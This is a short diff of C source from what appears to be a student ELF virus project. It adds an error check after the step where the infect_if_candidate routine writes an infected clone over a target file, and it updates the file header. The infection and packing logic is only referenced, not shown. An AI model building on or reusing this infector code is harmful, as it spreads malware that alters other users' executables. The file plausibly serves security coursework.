@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 17:29:04 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/11 23:43:31 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -62,7 +62,8 @@ inline bool	infect_if_candidate(const char *file)
 	if (!elf64_packer(food, food.original_safe.size))
 		return errors(ERR_THROW, '8','7');
 
-	write_clone_file(food.clone_safe, file);
+	if (!write_clone_file(food.clone_safe, file))
+		return errors(ERR_THROW, '8','8');
 
 	free_accessor(&food.original_safe);
 	free_accessor(&food.clone_safe);
